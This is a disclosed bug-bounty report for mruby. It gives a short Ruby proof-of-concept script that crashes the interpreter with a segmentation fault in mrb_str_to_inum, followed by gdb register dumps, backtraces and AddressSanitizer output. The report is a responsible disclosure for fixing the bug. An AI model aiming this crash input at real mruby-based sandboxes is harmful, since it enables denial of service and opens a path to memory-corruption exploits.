# SIGSEGV in mrb_str_inum

## Report Details
- **Report ID**: 217083
- **URL**: https://hackerone.com/reports/217083
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-29T19:49:09.398Z
- **Disclosed**: 2017-05-13T21:28:10.067Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mrb_str_inum.rb):

	def method_missing(*)false
	end
	def to_str()""end
	Integer(ÿ,2).h

Debug - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	r Reading symbols from ./mirb...idone.
	(gdb) r test_mrb_str_inum.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_str_inum.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	 => :to_str

	Program received signal SIGSEGV, Segmentation fault.
	0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 '\001') at /home/x/Desktop/test/mruby/src/string.c:2253
	2253	  len = RSTRING_LEN(str);
	(gdb) info reg
	rax            0x1	1
	rbx            0x6c3100	7090432
	rcx            0x7	7
	rdx            0x10	16
	rsi            0x6b01c0	7012800
	rdi            0x6b0010	7012368
	rbp            0x7fffffffc2c0	0x7fffffffc2c0
	rsp            0x7fffffffc290	0x7fffffffc290
	r8             0x2	2
	r9             0x0	0
	r10            0x0	0
	r11            0x7ffff7895770	140737346361200
	r12            0x401ca0	4201632
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x41f81a	0x41f81a <mrb_str_to_inum+69>
	eflags         0x10206	[ PF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	2248	{
	2249	  const char *s;
	2250	  mrb_int len;
	2251	
	2252	  s = mrb_string_value_ptr(mrb, str);
	2253	  len = RSTRING_LEN(str);
	2254	  return mrb_str_len_to_inum(mrb, s, len, base, badcheck);
	2255	}
	(gdb) x/x $rax
	0x1:	Cannot access memory at address 0x1

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 '\001') at /home/x/Desktop/test/mruby/src/string.c:2253
	#1  0x000000000042552c in mrb_convert_to_integer (mrb=0x6b0010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548
	#2  0x000000000046b2b5 in mrb_f_integer (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114
	#3  0x00000000004070bb in mrb_vm_exec (mrb=0x6b0010, proc=0x6b2230, pc=0x720660) at /home/x/Desktop/test/mruby/src/vm.c:1259
	#4  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b2230, self=..., stack_keep=1) at /home/x/Desktop/test/mruby/src/vm.c:823
	#5  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_str_inum.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	 => :to_str
	ASAN:DEADLYSIGNAL
	=================================================================
	==8627==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x000000510b04 bp 0x7fff5fbbe7f0 sp 0x7fff5fbbe7b0 T0)
		#0 0x510b03 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9
		#1 0x51c50e in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14
		#2 0x56c26b in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10
		#3 0x4f77a3 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18
		#4 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#5 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#6 0x7f205f22fec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#7 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum
	==8627==ABORTING

Debug - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test_mrb_str_inum.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_str_inum.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 '\001') at /home/x/Desktop/test/mruby/src/string.c:2253
	2253	  len = RSTRING_LEN(str);
	(gdb) info reg
	rax            0x1	1
	rbx            0x6c2100	7086336
	rcx            0x8	8
	rdx            0x10	16
	rsi            0x6af1c0	7008704
	rdi            0x6af010	7008272
	rbp            0x7fffffffd4c0	0x7fffffffd4c0
	rsp            0x7fffffffd490	0x7fffffffd490
	r8             0x2	2
	r9             0x0	0
	r10            0x0	0
	r11            0x7ffff7895770	140737346361200
	r12            0x401b20	4201248
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x40ff86	0x40ff86 <mrb_str_to_inum+69>
	eflags         0x10206	[ PF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	2248	{
	2249	  const char *s;
	2250	  mrb_int len;
	2251	
	2252	  s = mrb_string_value_ptr(mrb, str);
	2253	  len = RSTRING_LEN(str);
	2254	  return mrb_str_len_to_inum(mrb, s, len, base, badcheck);
	2255	}
	2256	
	2257	/* 15.2.10.5.38 */
	(gdb) x/x $rax
	0x1:	Cannot access memory at address 0x1

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 '\001') at /home/x/Desktop/test/mruby/src/string.c:2253
	#1  0x0000000000415c98 in mrb_convert_to_integer (mrb=0x6af010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548
	#2  0x000000000046aa60 in mrb_f_integer (mrb=0x6af010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114
	#3  0x0000000000441e14 in mrb_vm_exec (mrb=0x6af010, proc=0x6b1320, pc=0x718d28) at /home/x/Desktop/test/mruby/src/vm.c:1259
	#4  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823
	#5  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614
	#6  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cfa0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760
	#7  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cbe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769
	#8  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227

Clang - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_str_inum.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==7540==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x0000004fffe4 bp 0x7fff8680ee40 sp 0x7fff8680ee00 T0)
		#0 0x4fffe3 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9
		#1 0x50b9ee in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14
		#2 0x56b9cb in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10
		#3 0x53cb33 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18
		#4 0x53af3e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#5 0x543a03 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12
		#6 0x52cbc0 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7
		#7 0x52cd92 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10
		#8 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
		#9 0x7f033b21bec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#10 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum
	==7540==ABORTING

System information
-------------------

	SHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a
	Linux 14.04 x86_64
	gcc version 4.8.4
	

## Attachments
- test_mrb_str_inum.rb
